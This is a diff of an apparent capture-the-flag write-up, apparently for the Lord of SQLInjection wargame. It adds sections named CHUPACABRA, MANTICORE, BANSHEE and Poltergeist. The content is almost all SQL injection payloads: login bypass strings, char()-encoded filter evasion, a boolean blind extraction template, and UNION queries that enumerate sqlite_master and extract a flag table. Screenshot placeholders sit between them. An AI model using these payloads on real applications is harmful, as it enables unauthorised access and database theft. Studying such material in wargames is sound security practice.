@@ -1076,9 +1076,39 @@ payload : 1'<@=1 OR {a ord(mid({pw},{i},1))}={j}%23
 
 payload : id=1'%23\&pw=%0Aunion/\*\*/select 0x6669727374, 0x7365636f6e64''%23
 
+## CHUPACABRA
+
+payload : ' or%20%20 id='admin'-- -
 
 
 
+## MANTICORE
+
+payload : id='\&pw=or id = char(0x61,0x64,0x6d,0x69,0x6e)-- -
+
+## BANSHEE(boolean)
+
+payload: 'or 1=1 and substr({pw},1,{i}) = '{j}' and id ='admin'-- -
+
+## Poltergeist(sqlite3)
+
+table:&#x20;
+
+' UNION select tbl\_name from sqlite\_master where tbl\_name like 'flag\_%'--
+
+<figure><img src=".gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>
+
+column:
+
+' union SELECT sql FROM sqlite\_master WHERE tbl\_name = 'flag\_70c81d99' -- -
+
+<figure><img src=".gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>
+
+flag
+
+' union SELECT flag\_0876285c FROM flag\_70c81d99 -- -
+
+<figure><img src=".gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>
 
 
 
